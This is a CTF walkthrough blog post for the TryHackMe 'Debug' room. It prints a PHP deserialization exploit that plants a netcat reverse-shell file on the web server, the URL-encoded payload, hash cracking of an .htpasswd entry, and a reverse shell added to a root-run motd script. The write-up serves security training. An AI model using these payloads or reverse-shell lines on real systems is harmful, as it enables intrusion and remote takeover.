---
layout: post
title: TryHackMe Walkthrough - Debug
date: 2021-06-27
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Medium
- Machine
permalink: /2021/06/Debug
img: 2021/06/Debug/Debug.jpeg
---

After I finished the Wekor room by [ustoun0](https://tryhackme.com/p/ustoun0), I was very curious to try their other rooms. Debug was also fun, but a lot easier to do. On this one, I had to exploit PHP serialization, find a password in a hidden file and exploit bad file permissions on the Linux Message Of The Day.

* Room: Debug
* Difficulty: Medium
* URL: [https://tryhackme.com/room/debug](https://tryhackme.com/room/debug)
* Author: [ustoun0](https://tryhackme.com/p/ustoun0)

```
Linux Machine CTF! You'll learn about enumeration, finding hidden password files and how to exploit php deserialization!

Hey everybody!

Welcome to this Linux CTF Machine!

The main idea of this room is to make you learn more about php deserialization!

I hope you enjoy your journey :)
```

## Enumeration

I started by enumerating the machine. Port 22 (SSH) and 80 (HTTP) where opened.

```bash
$ rustscan -a target -- -A -script vuln | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.113.129:22
Open 10.10.113.129:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
```

## Web Site

I looked at the web site. It only displayed the Apache default page.

![Apache Default](/assets/images/2021/06/Debug/01_ApacheDefault.png "Apache Default")

I launched Gobuster to find hidden files and folders.

```bash
$ gobuster dir -e -u http://target.thm/ -t30 -w /usr/share/dirb/wordlists/common.txt  | tee gobuster.txt                                                                                 [3/3]
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/06/27 17:54:56 Starting gobuster in directory enumeration mode
===============================================================
http://target.thm/.htpasswd            (Status: 403) [Size: 275]
http://target.thm/.htaccess            (Status: 403) [Size: 275]
http://target.thm/.hta                 (Status: 403) [Size: 275]
http://target.thm/backup               (Status: 301) [Size: 309] [--> http://target.thm/backup/]
http://target.thm/grid                 (Status: 301) [Size: 307] [--> http://target.thm/grid/]
http://target.thm/index.html           (Status: 200) [Size: 11321]
http://target.thm/index.php            (Status: 200) [Size: 5732]
http://target.thm/javascript           (Status: 301) [Size: 313] [--> http://target.thm/javascript/]
http://target.thm/javascripts          (Status: 301) [Size: 314] [--> http://target.thm/javascripts/]
http://target.thm/server-status        (Status: 403) [Size: 275]

===============================================================
2021/06/27 17:55:40 Finished
===============================================================
```

This showed me that there is also an `index.php` file.

![Welcome To Base](/assets/images/2021/06/Debug/02_WelcomeToBase.png "Welcome To Base")

The backup folder contained a copy of the index.php, but renamed to `index.php.bak` so I could download it without it being interpreted on the server.

![Backup](/assets/images/2021/06/Debug/03_Backup.png "Backup")

It contained some html, but the interesting part was in a  PHP block near the end.

```php
<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name'];
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

	$this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();

?>
```

This code take the name, email and comment passed in the GET by a form on the page. It uses those values to build a message that gets written to the file `message.txt` when the object is destructed.

I tested it in the `index.php` page by sending this [http://target.thm/index.php?name=test&email=test&comments=test&select=1&checkbox=1](http://target.thm/index.php?name=test&email=test&comments=test&select=1&checkbox=1).

Then I  navigated to [http://target.thm/message.txt](http://target.thm/message.txt) and my data had been added to the file.

```
Message From :  || From Email :  || Comment :
Message From :  || From Email :  || Comment :
Message From :  || From Email :  || Comment :
Message From :  || From Email :  || Comment :
Message From :  || From Email :  || Comment :
Message From :  || From Email :  || Comment :
Message From :  || From Email :  || Comment :
Message From :  || From Email :  || Comment :
Message From : test || From Email : test || Comment : test

```

In the PHP file, there is some code left there for debugging.

```php
// Leaving this for now... only for debug purposes... do not touch!
$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);
```

If the URL contains a `debug` parameter, it will unserialize its content. That meant I could serialize an object of the class FormSubmit with the file and message I wanted. The server would then unserialize it, and when it would reach the end of the PHP block, the object would be out of scope and the class destructor would be called and my message would be written to the file I choose.

I created the object to insert a reverse shell in the file shell.php.

```php
<?php

class FormSubmit {

	public $form_file = 'shell.php';
	public $message = "
<?php
`mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg`;
	";

}

$o = new FormSubmit();
echo urlencode(serialize($o)) . "\n";
```

I ran the code that printed the serialized and URL encoded object.

```bash
$ php test.php
O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A112%3A%22%0A%3C%3Fphp%0A%60mkfifo+%2Ftmp%2Fkirxhbg%3B+nc+10.13.3.36+4444+0%3C%2Ftmp%2Fkirxhbg+%7C+%2Fbin%2Fsh+%3E%2Ftmp%2Fkirxhbg+2%3E%261%3B+rm+%2Ftmp%2Fkirxhbg%60%3B%0A%09%22%3B%7D

```

Then I opened the index file passing it my serialized object in the debug parameter:
```
http://target.thm/index.php?name=test&email=test&comments=test&select=1&checkbox=1&debug=O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A112%3A%22%0A%3C%3Fphp%0A%60mkfifo+%2Ftmp%2Fkirxhbg%3B+nc+10.13.3.36+4444+0%3C%2Ftmp%2Fkirxhbg+%7C+%2Fbin%2Fsh+%3E%2Ftmp%2Fkirxhbg+2%3E%261%3B+rm+%2Ftmp%2Fkirxhbg%60%3B%0A%09%22%3B%7D
```

I then started a netcat listener and accessed my new [shell.php](http://target.thm/shell.php)

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.113.129 38328

whoami
www-data
```

## James Password

Once connected, I started looking around the server. I missed it at first, but there was a .htpasswd file in the web root.

```bash
www-data@osboxes:/$ ls -la /var/www/html/
total 72
drwxr-xr-x 6 www-data www-data  4096 Jun 27 18:15 .
drwxr-xr-x 3 root     root      4096 Mar  9 19:56 ..
-rw-r--r-- 1 www-data www-data    44 Mar  9 20:09 .htpasswd
drwxr-xr-x 5 www-data www-data  4096 Mar  9 20:10 backup
drwxr-xr-x 2 www-data www-data  4096 Mar  9 20:10 grid
-rw-r--r-- 1 www-data www-data 11321 Mar  9 20:10 index.html
-rw-r--r-- 1 www-data www-data  6399 Mar  9 20:10 index.php
drwxr-xr-x 2 www-data www-data  4096 Mar  9 20:10 javascripts
drwxr-xr-x 2 www-data www-data  4096 Mar  9 20:10 less
-rw-r--r-- 1 www-data www-data   494 Jun 27 18:15 message.txt
-rw-r--r-- 1 www-data www-data  2339 Mar  9 20:10 readme.md
-rw-r--r-- 1 www-data www-data   112 Jun 27 18:15 shell.php
-rw-r--r-- 1 www-data www-data 10371 Mar  9 20:10 style.css

www-data@osboxes:/$ cat /var/www/html/.htpasswd
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
```

I used hashcat to crack the password. The password was pretty weak, it took 4 seconds to crack it. 

```bash
$ hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

=============================================================================================================================

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1:REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
Hash.Target......: $apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
Time.Started.....: Sun Jun 27 19:03:03 2021 (1 sec)
Time.Estimated...: Sun Jun 27 19:03:04 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     7312 H/s (8.18ms) @ Accel:128 Loops:250 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 768/14344385 (0.01%)
Rejected.........: 0/768 (0.00%)
Restore.Point....: 512/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidates.#1....: hockey -> james1

Started: Sun Jun 27 19:03:01 2021
Stopped: Sun Jun 27 19:03:05 2021
```

I used the cracked password to connect as james, and it worked.

```bash
$ ssh james@target
The authenticity of host 'target (10.10.113.129)' can't be established.
ECDSA key fingerprint is SHA256:JCUiGJ9gC+EZEJeudS9yMKLVlE7MtpS2rolJudHcCbQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target,10.10.113.129' (ECDSA) to the list of known hosts.
james@target's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

439 packages can be updated.
380 updates are security updates.

Last login: Wed Mar 10 18:36:58 2021 from 10.250.0.44

james@osboxes:~$ cat user.txt
REDACTED
```

## Getting root

Jame's home folder had a text file with a note from root.

```bash
$ cat Note-To-James.txt
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it?

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :)

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
```

According to this note, I should be able to modify the Message Of The Day (motd). 

```bash
james@osboxes:~$ ls -l /etc/update-motd.d/
total 28
-rwxrwxr-x 1 root james 1220 Mar 10 18:32 00-header
-rwxrwxr-x 1 root james    0 Mar 10 18:38 00-header.save
-rwxrwxr-x 1 root james 1259 Jun 27 19:13 10-help-text
-rwxrwxr-x 1 root james   97 Dec  7  2018 90-updates-available
-rwxrwxr-x 1 root james  299 Jul 22  2016 91-release-upgrade
-rwxrwxr-x 1 root james  142 Dec  7  2018 98-fsck-at-reboot
-rwxrwxr-x 1 root james  144 Dec  7  2018 98-reboot-required
-rwxrwxr-x 1 root james  604 Nov  5  2017 99-esm

james@osboxes:~$ cat /etc/update-motd.d/10-help-text
#!/bin/sh
#
#    10-help-text - print the help text associated with the distro
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>,
#             Brian Murray <brian@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

printf "\n"
printf " * Documentation:  https://help.ubuntu.com\n"
printf " * Management:     https://landscape.canonical.com\n"
printf " * Support:        https://ubuntu.com/advantage\n"
```

All the files are writable by james. Those files are executed by root. To get root I added a reverse shell at the end of `/etc/update-motd.d/10-help-text`.  It would be executed at the next login. 

```bash
james@osboxes:~$ cat /etc/update-motd.d/10-help-text

... 

printf "\n"
printf " * Documentation:  https://help.ubuntu.com\n"
printf " * Management:     https://landscape.canonical.com\n"
printf " * Support:        https://ubuntu.com/advantage\n"

mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg
```

Then I logged out, started a netcat listener, and connected back.

```bash
$ ssh james@target
james@target's password:
```

My listener got the connection back from the root user.

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.113.129 38428

whoami
root

cat /root/root.txt
REDACTED
```
